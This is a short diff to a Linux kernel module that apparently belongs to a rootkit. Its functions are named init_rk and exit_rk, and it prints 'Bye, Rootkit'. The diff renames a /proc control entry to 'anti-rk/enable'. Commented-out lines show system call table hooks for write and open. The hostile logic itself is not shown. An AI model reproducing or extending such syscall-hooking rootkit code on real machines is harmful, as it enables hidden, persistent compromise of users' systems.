@@ -543,9 +543,9 @@ static int init_rk(void)
 	// sys_call_table[__NR_WRITE] = hacked_write;
 	// sys_call_table[__NR_OPEN] = hacked_open;
 
-	example_dir = (*proc_mkdir_addr)("proc_test", NULL);
-   	hello_file = (*create_proc_entry_addr)("hello", S_IRUGO, example_dir);
-    strcpy(global_buffer, "hello");
+	example_dir = (*proc_mkdir_addr)("anti-rk", NULL);
+   	hello_file = (*create_proc_entry_addr)("enable", S_IRUGO, example_dir);
+    strcpy(global_buffer, "1");
     hello_file->read_proc = proc_read_hello;
     hello_file->write_proc = proc_write_hello;
 
@@ -556,8 +556,8 @@ static int init_rk(void)
 static void exit_rk(void)
 {
 	printk("Bye, Rootkit\n");
-	(*remove_proc_entry_addr)("hello", example_dir);
-	(*remove_proc_entry_addr)("proc_test", NULL);
+	(*remove_proc_entry_addr)("enable", example_dir);
+	(*remove_proc_entry_addr)("anti-rk", NULL);
 }
 
 module_init(init_rk);
